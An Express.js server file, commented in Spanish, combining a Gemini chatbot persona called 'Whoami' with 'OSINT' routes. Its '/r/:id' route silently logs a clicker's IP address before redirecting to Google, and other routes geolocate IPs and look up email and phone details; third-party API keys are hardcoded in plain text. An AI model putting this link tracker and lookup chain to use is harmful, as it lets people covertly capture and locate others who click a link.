const express = require('express');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

let logs = {}; 

app.get('/r/:id', (req, res) => {
    const id = req.params.id;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    logs[id] = { ip: ip, fecha: new Date().toLocaleString() };
    console.log(`Clic detectado en ID ${id} desde IP: ${ip}`);
    res.redirect('https://google.com'); 
});

app.get('/api/get-logs/:id', (req, res) => {
    const id = req.params.id;
    if (logs[id]) {
        res.json(logs[id]);
    } else {
        res.status(404).json({ error: "No hay datos aún para este enlace" });
    }
});

// Cerebro inteligente y blindado de Whoami
app.post('/api/chat', async (req, res) => {
    try {
        const { mensaje } = req.body;
        if (!mensaje || !mensaje.trim()) {
            return res.json({ response: "¡Hola Barsa! Escribe algo para que comencemos a conversar." });
        }

        const apiKey = process.env.GEMINI_API_KEY ? process.env.GEMINI_API_KEY.trim() : "";
        if (!apiKey) {
            return res.json({ response: "⚠️ Falta configurar la API Key de Gemini en Render." });
        }

        // Usamos la API oficial y directa de Google Generative Language
        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${apiKey}`;

        const promptSistema = "Eres Whoami, una inteligencia artificial avanzada, amigable, cercana y experta en todo tipo de disciplinas: programación, matemáticas, historia, tecnología y ciencia. Eres de género femenino, hablas en español de forma natural, fluida y humana, tuteando siempre al usuario (Barsa). Responde de forma directa, inteligente y con un toque cálido.";

        const responseApi = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                contents: [
                    {
                        parts: [
                            { text: `${promptSistema}\n\nUsuario (Barsa): ${mensaje}` }
                        ]
                    }
                ]
            })
        });

        const data = await responseApi.json();

        if (!responseApi.ok) {
            return res.json({ response: `⚠️ Error de la API (${responseApi.status}): ${data.error?.message || 'Error desconocido'}` });
        }

        let respuestaIA = "¡Ey Barsa, me quedé pensando un segundo! ¿Me repites la pregunta?";
        if (data.candidates && data.candidates[0]?.content?.parts?.[0]?.text) {
            respuestaIA = data.candidates[0].content.parts[0].text;
        }

        res.json({ response: respuestaIA });

    } catch (error) {
        console.error("Error en /api/chat:", error);
        res.json({ response: "⚠️ Error interno en el servidor: " + error.message });
    }
});

// --- RUTAS DE OSINT ---

app.get('/api/ip/:targetIp', async (req, res) => {
    const ip = req.params.targetIp;
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await response.json();
        if (data.status === 'fail') return res.status(400).json({ error: "No se pudo obtener información" });
        res.json({ existe: true, ip: data.query, pais: data.country, region: data.regionName, ciudad: data.city, isp: data.isp, latitud: data.lat, longitud: data.lon });
    } catch (error) {
        res.status(500).json({ error: "Error de conexión" });
    }
});

app.get('/api/email/:email', async (req, res) => {
    const email = req.params.email;
    const apiKey = "a0633aeb05fe4a3082cab81fc92490bd";
    try {
        const response = await fetch(`https://emailreputation.abstractapi.com/v1/?api_key=${apiKey}&email=${encodeURIComponent(email)}`);
        if (!response.ok) throw new Error("Error al conectar con Abstract API");
        const data = await response.json();
        res.json({
            email_address: data.email_address,
            email_deliverability: data.email_deliverability,
            email_sender: data.email_sender,
            email_domain: data.email_domain,
            email_quality: data.email_quality
        });
    } catch (error) {
        console.error("Error en /api/email:", error);
        res.status(500).json({ error: "Error al validar el correo en tiempo real" });
    }
});

app.get('/api/phone/:number', async (req, res) => {
    const number = req.params.number;
    const apiKey = 'f69d5192d997c1630282d368282becf7';
    try {
        const response = await fetch(`http://apilayer.net/api/validate?access_key=${apiKey}&number=${number}&format=1`);
        const data = await response.json();
        res.json({ valido: data.valid, numero: data.number, pais: data.country_name, operador: data.carrier, tipo: data.line_type });
    } catch (error) {
        res.status(500).json({ error: "Error al consultar la API" });
    }
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Servidor corriendo en el puerto ${port}`);
});
